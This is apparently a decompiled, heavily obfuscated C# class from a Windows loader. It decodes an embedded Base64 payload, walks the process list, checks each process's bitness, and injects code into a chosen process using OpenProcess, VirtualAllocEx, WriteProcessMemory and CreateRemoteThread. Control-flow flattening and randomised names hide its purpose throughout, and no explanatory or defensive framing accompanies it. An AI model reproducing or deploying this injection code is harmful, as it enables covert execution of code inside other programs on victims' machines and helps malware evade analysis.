using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using MzzTwKYqSx;
using ZTgqKtPyui;

namespace uvNb2mlpdy;

internal class y2QgG4HTfhc0
{
	public enum TqFu3Cz2Nm0m
	{
		af24X8mtL6Tt,
		MKewNGBRhPRB,
		ZYYHiPVgdQci,
		pOPKxjJBsLpB
	}

	internal struct VSdd9MaoQX0o
	{
		public ushort aMTTVJih6yKI;

		public ushort d55Umft0mdf3;

		public uint DdtnIrpGrZ4x;

		public IntPtr tnoQQZ5FWUip;

		public IntPtr wC2Xmza9Qhbx;

		public UIntPtr yWofQQBHsYmN;

		public uint P2b8aQZXHlCk;

		public uint uint_0;

		public uint wkMt5OihFb3s;

		public ushort tIbfZZ0MKNkA;

		public ushort XUwF14IFQ5ky;
	}

	internal const ushort ushort_0 = 0;

	internal const ushort HXkze4fhuHKz = 6;

	internal const ushort Zfo5ggsepJXI = 9;

	internal const ushort Qqv89nFRKsSY = ushort.MaxValue;

	private const int iZtFecdWx9kc = 2;

	private const int int_0 = 1024;

	private const int v4cr2IHt3OHv = 8;

	private const int ZkLzDlNBYiHN = 32;

	private const int tDUfN2UOyEmj = 16;

	private const uint O2e38GwfNTI8 = 4096u;

	private const uint LrC65PPxzsm3 = 8192u;

	private const uint uint_0 = 4u;

	private const uint uint_1 = uint.MaxValue;

	private const uint uint_2 = 128u;

	private const uint FkFQoXagXuP1 = 0u;

	private const uint cQUmw5FJEU3d = 258u;

	private byte[] byte_0;

	private W7h8mXtAeGxR jBz5PFospHTl;

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsWow64Process([In] IntPtr intptr_0, out bool CbFa072QvzrP);

	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int O2C83guWRBZc, bool jmwrsKD3zrwa, int int_1);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr CzgzD74TcSh8, string aGbc9e7jZNcM);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr EdXr50GUP42g, IntPtr zhEIZZTLm20f, uint SWuGhYm1evt1, uint BCO7LFZ5ZqUS, uint D5QF5v223gVO);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr WYBgd61y1VPB, IntPtr R3Q4q4WRMiiO, byte[] BXKy8OcZyK9M, uint GtTAysEJMfXt, out UIntPtr vrS36qhXTm2s);

	[DllImport("kernel32.dll")]
	private static extern IntPtr CreateRemoteThread(IntPtr sPdYrIDQ0Hqr, IntPtr T5d8KpuvFTOs, uint HE6lCF7TwZXb, IntPtr PozovGNnbmJl, IntPtr PD7HRMRQSGod, uint a1jlg2hoXtYb, IntPtr oEz2yLIbqniU);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr JXnZiCX5gfjZ);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern uint WaitForSingleObject(IntPtr intptr_0, uint Z1OxZWlz2HyF);

	[DllImport("kernel32.dll")]
	private static extern bool GetExitCodeThread(IntPtr UpMmccIDbah4, out uint lFraDbbb5KRt);

	[DllImport("kernel32.dll")]
	private static extern void GetNativeSystemInfo(ref VSdd9MaoQX0o cd8MkvyQbuPV);

	[DllImport("kernel32.dll")]
	private static extern void GetSystemInfo(ref VSdd9MaoQX0o vsdd9MaoQX0o_0);

	public byte[] method_0()
	{
		return y2QgG4HTfhc0.mmduoPbhPAfxaZwAzSXRWZdjDSjI(_003CModule_003E.feoSSsxfXyCnLajslDIWWVahFHAQ<string>(1823997152u));
	}

	public y2QgG4HTfhc0()
	{
		byte_0 = method_0();
		jBz5PFospHTl = new W7h8mXtAeGxR(byte_0);
	}

	public int KRfi4vivvrBO()
	{
		Process[] array = y2QgG4HTfhc0.jKRmDdaKGaiQjYWTJwfMQrdDlgmO();
		int num = y2QgG4HTfhc0.QnKOxCsYMWJncvtACxDltNyLFvyJ(y2QgG4HTfhc0.xJpWTFjmGbBjzKYKVZaowpyPankh());
		Process[] array2 = array;
		int num2 = _003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(3796529857u);
		Process process = default(Process);
		while (true)
		{
			int num3;
			int num4;
			if (num2 < array2.Length)
			{
				num3 = 1535025182;
				num4 = 1535025182;
			}
			else
			{
				num3 = 1651307235;
				num4 = 1651307235;
			}
			while (true)
			{
				int num5 = num3;
				uint num6;
				switch ((num6 = (uint)(-(num5 + -1754793816 + -1724192808))) % 9u)
				{
				case 8u:
					num3 = 1535025182;
					continue;
				case 7u:
					process = array2[num2];
					num3 = -929995771;
					continue;
				case 3u:
				{
					int num9;
					int num10;
					if (y2QgG4HTfhc0.QnKOxCsYMWJncvtACxDltNyLFvyJ(process) != num)
					{
						num9 = 1183056085;
						num10 = 1183056085;
					}
					else
					{
						num9 = 1448513232;
						num10 = 1448513232;
					}
					num3 = num9 ^ (int)(num6 * 279176886);
					continue;
				}
				case 2u:
				{
					int num11;
					int num12;
					if (!(jBz5PFospHTl.Ya9khNABzMBy(y2QgG4HTfhc0.QnKOxCsYMWJncvtACxDltNyLFvyJ(process)) != IntPtr.Zero))
					{
						num11 = 1296142266;
						num12 = 1296142266;
					}
					else
					{
						num11 = 2043753996;
						num12 = 2043753996;
					}
					num3 = num11 ^ (int)(num6 * 293679224);
					continue;
				}
				case 1u:
				{
					int num7;
					int num8;
					if (!THxMrpTedxkX(process))
					{
						num7 = -1060939252;
						num8 = -1060939252;
					}
					else
					{
						num7 = 590499421;
						num8 = 590499421;
					}
					num3 = num7 ^ (int)(num6 * 435941271);
					continue;
				}
				case 0u:
					num2 += _003CModule_003E.feoSSsxfXyCnLajslDIWWVahFHAQ<int>(2974719385u);
					num3 = -1791596463;
					continue;
				case 5u:
					break;
				case 4u:
					return y2QgG4HTfhc0.QnKOxCsYMWJncvtACxDltNyLFvyJ(process);
				default:
					return _003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(3942883017u);
				}
				break;
			}
		}
	}

	public int method_1()
	{
		Process[] array = y2QgG4HTfhc0.jKRmDdaKGaiQjYWTJwfMQrdDlgmO();
		int num = y2QgG4HTfhc0.QnKOxCsYMWJncvtACxDltNyLFvyJ(y2QgG4HTfhc0.xJpWTFjmGbBjzKYKVZaowpyPankh());
		Process[] array2 = array;
		Process process = default(Process);
		int num5 = default(int);
		while (true)
		{
			int num2 = -1991591989;
			while (true)
			{
				int num3 = num2;
				uint num4;
				switch ((num4 = (uint)(~num3) ^ 0x46EE40A2u ^ 0x327E0583u) % 9u)
				{
				case 7u:
				{
					int num9;
					int num10;
					if (jBz5PFospHTl.xaWQMyT5lWT8(y2QgG4HTfhc0.QnKOxCsYMWJncvtACxDltNyLFvyJ(process)))
					{
						num9 = 1482119067;
						num10 = 1482119067;
					}
					else
					{
						num9 = 1608309103;
						num10 = 1608309103;
					}
					num2 = num9 ^ (int)(num4 * 1821614941);
					continue;
				}
				case 6u:
				{
					int num7;
					int num8;
					if (THxMrpTedxkX(process))
					{
						num7 = -770630327;
						num8 = -770630327;
					}
					else
					{
						num7 = -1931130784;
						num8 = -1931130784;
					}
					num2 = num7 ^ (int)(num4 * 195113023);
					continue;
				}
				case 4u:
				{
					int num11;
					if (num5 < array2.Length)
					{
						num2 = -1731709393;
						num11 = -1731709393;
					}
					else
					{
						num2 = -1620538539;
						num11 = -1620538539;
					}
					continue;
				}
				case 3u:
					num5 += _003CModule_003E.hhxFDPmIHoufoEIvTzswdgBraYsK<int>(4229151622u);
					num2 = -43233728;
					continue;
				case 1u:
					num5 = _003CModule_003E.oTVdMrsIOBMvvseqmKqvOhdYcLam<int>(1157660488u);
					num2 = (int)((num4 * 2123349806) ^ 0x514A4A86);
					continue;
				case 0u:
				{
					process = array2[num5];
					int num6;
					if (y2QgG4HTfhc0.QnKOxCsYMWJncvtACxDltNyLFvyJ(process) != num)
					{
						num2 = -1044780370;
						num6 = -1044780370;
					}
					else
					{
						num2 = -766257447;
						num6 = -766257447;
					}
					continue;
				}
				case 5u:
					break;
				case 2u:
					return y2QgG4HTfhc0.QnKOxCsYMWJncvtACxDltNyLFvyJ(process);
				default:
					return _003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3544027488u);
				}
				break;
			}
		}
	}

	public uint method_2(int YhGZtFv4fXmb, string bTwOli7g5qZl, string iybzDluqX6Xn, string mXr7msCdXj5t, int rBqquq0V48zx)
	{
		uint lFraDbbb5KRt = (uint)_003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(437222177u);
		mTKbGK4kGeaX mTKbGK4kGeaX = default(mTKbGK4kGeaX);
		IntPtr intPtr = default(IntPtr);
		IntPtr intPtr4 = default(IntPtr);
		IntPtr intPtr3 = default(IntPtr);
		IntPtr intPtr2 = default(IntPtr);
		uint result = default(uint);
		Process process_ = default(Process);
		while (true)
		{
			int num = 860803248;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(238143628 - ~(-(~num2)) * 1917868453)) % 6u)
				{
				case 5u:
					mTKbGK4kGeaX.kumCkDwh2bqP = iybzDluqX6Xn;
					mTKbGK4kGeaX.QvPYSOWdhG5b = mXr7msCdXj5t;
					num = (int)(num3 * 2047863308) ^ -1376840415;
					continue;
				case 3u:
					mTKbGK4kGeaX.N1sf1kCUNqY9 = rBqquq0V48zx;
					num = ((int)num3 * -1282001569) ^ 0x50AA8439;
					continue;
				case 2u:
					intPtr = IntPtr.Zero;
					num = (int)(num3 * 1652845343) ^ -103117867;
					continue;
				case 1u:
					mTKbGK4kGeaX.paWXgepgG5Fp = bTwOli7g5qZl;
					num = (int)(num3 * 1984631267) ^ -15498756;
					continue;
				case 0u:
					break;
				default:
				{
					IntPtr intptr_ = y2QgG4HTfhc0.SpSkHLYbhCgKiqrvNATZjEJxDswEb(y2QgG4HTfhc0.PaRAUYDTLXkqdtJDjlBybuJiSJAhc((object)mTKbGK4kGeaX));
					try
					{
						y2QgG4HTfhc0.wXtqFwbnhmlXnZfUgSbYrsNVgHPc((object)mTKbGK4kGeaX, intptr_, (byte)_003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(1107493561u) != 0);
						byte[] array = new byte[y2QgG4HTfhc0.PaRAUYDTLXkqdtJDjlBybuJiSJAhc((object)mTKbGK4kGeaX)];
						y2QgG4HTfhc0.TkNcHGNIwCtzDjNpLRcvpoYhkJPI(intptr_, array, _003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(3942883017u), y2QgG4HTfhc0.PaRAUYDTLXkqdtJDjlBybuJiSJAhc((object)mTKbGK4kGeaX));
						while (true)
						{
							int num4 = -1902328768;
							while (true)
							{
								num2 = num4;
								switch ((num3 = (uint)(238143628 - ~(-(~num2)) * 1917868453)) % 20u)
								{
								case 19u:
								{
									intPtr4 = VirtualAllocEx(intPtr, IntPtr.Zero, (uint)y2QgG4HTfhc0.PaRAUYDTLXkqdtJDjlBybuJiSJAhc((object)mTKbGK4kGeaX), (uint)_003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3179193482u), (uint)_003CModule_003E.feoSSsxfXyCnLajslDIWWVahFHAQ<int>(2180557905u));
									int num7;
									if (intPtr4 == IntPtr.Zero)
									{
										num4 = 1925105204;
										num7 = 1925105204;
									}
									else
									{
										num4 = -1184327985;
										num7 = -1184327985;
									}
									continue;
								}
								case 18u:
									GetExitCodeThread(intPtr3, out lFraDbbb5KRt);
									num4 = (int)(num3 * 2109931923) ^ -1404527952;
									continue;
								case 16u:
								{
									int num8;
									int num9;
									if (!(intPtr == IntPtr.Zero))
									{
										num8 = -472860095;
										num9 = -472860095;
									}
									else
									{
										num8 = 1575727108;
										num9 = 1575727108;
									}
									num4 = num8 ^ ((int)num3 * -1366508147);
									continue;
								}
								case 15u:
								{
									int num10;
									int num11;
									if (intPtr2 == IntPtr.Zero)
									{
										num10 = 837358201;
										num11 = 837358201;
									}
									else
									{
										num10 = -54375068;
										num11 = -54375068;
									}
									num4 = num10 ^ ((int)num3 * -221253986);
									continue;
								}
								case 14u:
									result = (uint)_003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(2034061402u);
									num4 = ((int)num3 * -409295960) ^ -888384965;
									continue;
								case 12u:
									process_ = y2QgG4HTfhc0.cIqLipmjNRkTCHRVsBiIbrkfhQjQ(YhGZtFv4fXmb);
									num4 = -915564701;
									continue;
								case 11u:
									intPtr3 = CreateRemoteThread(intPtr, IntPtr.Zero, (uint)_003CModule_003E.aizjhVmfLUVdUONSWEziAeATgcHAA<int>(965178568u), intPtr2, intPtr4, (uint)_003CModule_003E.oTVdMrsIOBMvvseqmKqvOhdYcLam<int>(1157660488u), IntPtr.Zero);
									num4 = ((int)num3 * -564031448) ^ -343473276;
									continue;
								case 10u:
								{
									int num5;
									int num6;
									if (intPtr3 != IntPtr.Zero)
									{
										num5 = 1652011015;
										num6 = 1652011015;
									}
									else
									{
										num5 = 23927165;
										num6 = 23927165;
									}
									num4 = num5 ^ ((int)num3 * -1730771103);
									continue;
								}
								case 9u:
									result = (uint)_003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(3141686001u);
									num4 = (int)(num3 * 1871482553) ^ -1386606092;
									continue;
								case 8u:
									CloseHandle(intPtr3);
									num4 = ((int)num3 * -85015643) ^ 0x35BD5F2F;
									continue;
								case 6u:
									result = (uint)_003CModule_003E.aizjhVmfLUVdUONSWEziAeATgcHAA<int>(1709735125u);
									num4 = (int)((num3 * 70592106) ^ 0x3CFFB632);
									continue;
								case 5u:
								{
									WriteProcessMemory(intPtr, intPtr4, array, (uint)array.Length, out var _);
									num4 = 311188889;
									continue;
								}
								case 3u:
									WaitForSingleObject(intPtr3, (uint)_003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(432583950u));
									num4 = (int)((num3 * 1566126089) ^ 0x2FB6EAE7);
									continue;
								case 2u:
									intPtr2 = jBz5PFospHTl.XoBzhaffWRrn(YhGZtFv4fXmb, _003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<string>(822682515u));
									num4 = ((int)num3 * -1445315285) ^ 0x2B7F06BF;
									continue;
								case 1u:
									intPtr = OpenProcess(_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(2986170620u), (byte)_003CModule_003E.hhxFDPmIHoufoEIvTzswdgBraYsK<int>(3921789756u) != 0, y2QgG4HTfhc0.QnKOxCsYMWJncvtACxDltNyLFvyJ(process_));
									num4 = ((int)num3 * -167551280) ^ -1161204970;
									continue;
								case 4u:
									break;
								default:
									return lFraDbbb5KRt;
								case 17u:
									return lFraDbbb5KRt;
								case 0u:
									return result;
								case 7u:
									return result;
								case 13u:
									return result;
								}
								break;
							}
						}
					}
					finally
					{
						y2QgG4HTfhc0.AUdHkQKqxOcRTdKRNPwzxpPAcsiYA(intptr_);
						while (true)
						{
							IL_0478:
							int num12 = 939333195;
							while (true)
							{
								num2 = num12;
								switch ((num3 = (uint)(238143628 - ~(-(~num2)) * 1917868453)) % 4u)
								{
								case 1u:
								{
									int num13;
									int num14;
									if (!(intPtr != IntPtr.Zero))
									{
										num13 = 189678400;
										num14 = 189678400;
									}
									else
									{
										num13 = -642403817;
										num14 = -642403817;
									}
									num12 = num13 ^ (int)(num3 * 573884593);
									continue;
								}
								case 0u:
									CloseHandle(intPtr);
									num12 = ((int)num3 * -987077274) ^ 0x5B6227ED;
									continue;
								default:
									goto end_IL_0449;
								case 2u:
									break;
								case 3u:
									goto end_IL_0449;
								}
								goto IL_0478;
								continue;
								end_IL_0449:
								break;
							}
							break;
						}
					}
				}
				}
				break;
			}
		}
	}

	public uint aOF82fIn3GGq(int Q3mjls6DgsUt)
	{
		uint lFraDbbb5KRt = (uint)_003CModule_003E.jvPOUHKshbGFGQgOLofQnirJPPcO<int>(1694560637u);
		Process process_ = y2QgG4HTfhc0.cIqLipmjNRkTCHRVsBiIbrkfhQjQ(Q3mjls6DgsUt);
		IntPtr intPtr = IntPtr.Zero;
		IntPtr intPtr2 = IntPtr.Zero;
		try
		{
			IntPtr intPtr3 = jBz5PFospHTl.XoBzhaffWRrn(Q3mjls6DgsUt, _003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<string>(3735895429u));
			uint result = default(uint);
			while (true)
			{
				int num = 142556192;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(-(num2 ^ -1070886822) * 977967119)) % 13u)
					{
					case 12u:
						intPtr = OpenProcess(_003CModule_003E.SLiDcqHjvKywkpNIakyLDdRfDXoKA<int>(586224337u), (byte)_003CModule_003E.oTVdMrsIOBMvvseqmKqvOhdYcLam<int>(1157660488u) != 0, y2QgG4HTfhc0.QnKOxCsYMWJncvtACxDltNyLFvyJ(process_));
						num = -1759270480;
						continue;
					case 11u:
						intPtr2 = CreateRemoteThread(intPtr, IntPtr.Zero, (uint)_003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3544027488u), intPtr3, IntPtr.Zero, (uint)_003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(2607518149u), IntPtr.Zero);
						num = 722847957;
						continue;
					case 8u:
						CloseHandle(intPtr2);
						num = ((int)num3 * -1678136529) ^ -458250030;
						continue;
					case 6u:
						result = (uint)_003CModule_003E.SLiDcqHjvKywkpNIakyLDdRfDXoKA<int>(3680202595u);
						num = ((int)num3 * -1539046355) ^ -1526598384;
						continue;
					case 5u:
						GetExitCodeThread(intPtr2, out lFraDbbb5KRt);
						num = ((int)num3 * -140858359) ^ -622550030;
						continue;
					case 3u:
					{
						int num6;
						int num7;
						if (intPtr2 != IntPtr.Zero)
						{
							num6 = 1552816948;
							num7 = 1552816948;
						}
						else
						{
							num6 = 1383734789;
							num7 = 1383734789;
						}
						num = num6 ^ ((int)num3 * -1566164863);
						continue;
					}
					case 2u:
					{
						int num8;
						int num9;
						if (intPtr3 == IntPtr.Zero)
						{
							num8 = 1235305116;
							num9 = 1235305116;
						}
						else
						{
							num8 = 879148583;
							num9 = 879148583;
						}
						num = num8 ^ ((int)num3 * -396726963);
						continue;
					}
					case 1u:
						WaitForSingleObject(intPtr2, (uint)_003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(2010491957u));
						num = (int)((num3 * 612064622) ^ 0x623E3CE4);
						continue;
					case 0u:
					{
						int num4;
						int num5;
						if (!(intPtr == IntPtr.Zero))
						{
							num4 = -815510342;
							num5 = -815510342;
						}
						else
						{
							num4 = -1692398354;
							num5 = -1692398354;
						}
						num = num4 ^ ((int)num3 * -1160545027);
						continue;
					}
					case 4u:
						break;
					case 7u:
						return (uint)_003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(3297073939u);
					default:
						return lFraDbbb5KRt;
					case 10u:
						return lFraDbbb5KRt;
					case 9u:
						return result;
					}
					break;
				}
			}
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				while (true)
				{
					IL_0255:
					int num10 = -1548210373;
					while (true)
					{
						int num2 = num10;
						uint num3;
						switch ((num3 = (uint)(-(num2 ^ -1070886822) * 977967119)) % 3u)
						{
						case 2u:
							goto IL_0217;
						default:
							goto end_IL_022c;
						case 0u:
							break;
						case 1u:
							goto end_IL_022c;
						}
						goto IL_0255;
						IL_0217:
						CloseHandle(intPtr);
						num10 = (int)(num3 * 2073021948) ^ -1776734757;
						continue;
						end_IL_022c:
						break;
					}
					break;
				}
			}
		}
	}

	private bool THxMrpTedxkX(Process Pl9A8FOnGEWY)
	{
		if (y2QgG4HTfhc0.WUoETOiYpvMskBBwNtCSCrHEnUTf(y2QgG4HTfhc0.OIABzjxZkCppfqUUwezjvFQnYpMd(y2QgG4HTfhc0.EGhpnEuhWXcqznwOPBscbAnYdhSR())) >= _003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(1770737331u))
		{
			ushort aMTTVJih6yKI = default(ushort);
			VSdd9MaoQX0o cd8MkvyQbuPV = default(VSdd9MaoQX0o);
			IntPtr intPtr = default(IntPtr);
			bool CbFa072QvzrP = default(bool);
			while (true)
			{
				int num = 1303050998;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(1724087397 - (-450993807 - -((num2 + -68057688) * -221301207)))) % 20u)
					{
					case 19u:
					{
						int num14;
						int num15;
						if (aMTTVJih6yKI != _003CModule_003E.aizjhVmfLUVdUONSWEziAeATgcHAA<int>(1461549606u))
						{
							num14 = -343897561;
							num15 = -343897561;
						}
						else
						{
							num14 = -618845130;
							num15 = -618845130;
						}
						num = num14 ^ ((int)num3 * -2033336290);
						continue;
					}
					case 18u:
						cd8MkvyQbuPV = default(VSdd9MaoQX0o);
						num = 1340442218;
						continue;
					case 15u:
						_003CModule_003E.oTVdMrsIOBMvvseqmKqvOhdYcLam<int>(161793191u);
						num = (int)(num3 * 725865101) ^ -1447849417;
						continue;
					case 14u:
						aMTTVJih6yKI = cd8MkvyQbuPV.aMTTVJih6yKI;
						num = (int)(num3 * 287205835) ^ -1534548514;
						continue;
					case 12u:
					{
						int num8;
						int num9;
						if (aMTTVJih6yKI == 0)
						{
							num8 = -355958599;
							num9 = -355958599;
						}
						else
						{
							num8 = 1933271345;
							num9 = 1933271345;
						}
						num = num8 ^ ((int)num3 * -1614399845);
						continue;
					}
					case 11u:
					{
						int num10;
						int num11;
						if (IsWow64Process(intPtr, out CbFa072QvzrP))
						{
							num10 = 346657957;
							num11 = 346657957;
						}
						else
						{
							num10 = 728253107;
							num11 = 728253107;
						}
						num = num10 ^ ((int)num3 * -624883024);
						continue;
					}
					case 10u:
						CbFa072QvzrP = (byte)_003CModule_003E.feoSSsxfXyCnLajslDIWWVahFHAQ<int>(1143276503u) != 0;
						intPtr = OpenProcess(_003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(1718058323u), (byte)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(3796529857u) != 0, y2QgG4HTfhc0.QnKOxCsYMWJncvtACxDltNyLFvyJ(Pl9A8FOnGEWY));
						num = -137804121;
						continue;
					case 6u:
					{
						int num6;
						int num7;
						if (y2QgG4HTfhc0.WUoETOiYpvMskBBwNtCSCrHEnUTf(y2QgG4HTfhc0.OIABzjxZkCppfqUUwezjvFQnYpMd(y2QgG4HTfhc0.EGhpnEuhWXcqznwOPBscbAnYdhSR())) < _003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(1896424339u))
						{
							num6 = -2048783469;
							num7 = -2048783469;
						}
						else
						{
							num6 = -949214794;
							num7 = -949214794;
						}
						num = num6 ^ ((int)num3 * -388703240);
						continue;
					}
					case 5u:
					{
						int num16;
						int num17;
						if (intPtr != IntPtr.Zero)
						{
							num16 = 1624242864;
							num17 = 1624242864;
						}
						else
						{
							num16 = -1247128274;
							num17 = -1247128274;
						}
						num = num16 ^ ((int)num3 * -1730154151);
						continue;
					}
					case 3u:
						CloseHandle(intPtr);
						num = 1781897604;
						continue;
					case 2u:
						GetNativeSystemInfo(ref cd8MkvyQbuPV);
						num = (int)(num3 * 631010085) ^ -795521460;
						continue;
					case 1u:
					{
						int num12;
						int num13;
						if (y2QgG4HTfhc0.NMrrQMEtmkEgdPpDuzBpZNwnYpOu(y2QgG4HTfhc0.OIABzjxZkCppfqUUwezjvFQnYpMd(y2QgG4HTfhc0.EGhpnEuhWXcqznwOPBscbAnYdhSR())) < _003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(1669414603u))
						{
							num12 = -989354654;
							num13 = -989354654;
						}
						else
						{
							num12 = 882650896;
							num13 = 882650896;
						}
						num = num12 ^ (int)(num3 * 1252857750);
						continue;
					}
					case 0u:
					{
						int num4;
						int num5;
						if (!CbFa072QvzrP)
						{
							num4 = 1995176990;
							num5 = 1995176990;
						}
						else
						{
							num4 = -1975517945;
							num5 = -1975517945;
						}
						num = num4 ^ ((int)num3 * -164619303);
						continue;
					}
					case 16u:
						break;
					case 4u:
						return (byte)_003CModule_003E.oTVdMrsIOBMvvseqmKqvOhdYcLam<int>(2148551598u) != 0;
					case 7u:
						return (byte)_003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(3942883017u) != 0;
					default:
						return (byte)_003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(716240967u) != 0;
					case 13u:
						return (byte)_003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3544027488u) != 0;
					case 17u:
						return (byte)_003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(1107493561u) != 0;
					case 8u:
						goto end_IL_029c;
					}
					break;
				}
				continue;
				end_IL_029c:
				break;
			}
		}
		return (byte)_003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(1107493561u) != 0;
	}

	static byte[] mmduoPbhPAfxaZwAzSXRWZdjDSjI(string string_0)
	{
		return Convert.FromBase64String(string_0);
	}

	static Process[] jKRmDdaKGaiQjYWTJwfMQrdDlgmO()
	{
		return Process.GetProcesses();
	}

	static Process xJpWTFjmGbBjzKYKVZaowpyPankh()
	{
		return Process.GetCurrentProcess();
	}

	static int QnKOxCsYMWJncvtACxDltNyLFvyJ(Process process_0)
	{
		return process_0.Id;
	}

	static int PaRAUYDTLXkqdtJDjlBybuJiSJAhc(object object_0)
	{
		return Marshal.SizeOf(object_0);
	}

	static IntPtr SpSkHLYbhCgKiqrvNATZjEJxDswEb(int int_1)
	{
		return Marshal.AllocHGlobal(int_1);
	}

	static void wXtqFwbnhmlXnZfUgSbYrsNVgHPc(object object_0, IntPtr intptr_0, bool bool_0)
	{
		Marshal.StructureToPtr(object_0, intptr_0, bool_0);
	}

	static void TkNcHGNIwCtzDjNpLRcvpoYhkJPI(IntPtr intptr_0, byte[] byte_1, int int_1, int int_2)
	{
		Marshal.Copy(intptr_0, byte_1, int_1, int_2);
	}

	static Process cIqLipmjNRkTCHRVsBiIbrkfhQjQ(int int_1)
	{
		return Process.GetProcessById(int_1);
	}

	static void AUdHkQKqxOcRTdKRNPwzxpPAcsiYA(IntPtr intptr_0)
	{
		Marshal.FreeHGlobal(intptr_0);
	}

	static OperatingSystem EGhpnEuhWXcqznwOPBscbAnYdhSR()
	{
		return Environment.OSVersion;
	}

	static Version OIABzjxZkCppfqUUwezjvFQnYpMd(OperatingSystem operatingSystem_0)
	{
		return operatingSystem_0.Version;
	}

	static int WUoETOiYpvMskBBwNtCSCrHEnUTf(Version version_0)
	{
		return version_0.Major;
	}

	static int NMrrQMEtmkEgdPpDuzBpZNwnYpOu(Version version_0)
	{
		return version_0.Minor;
	}
}
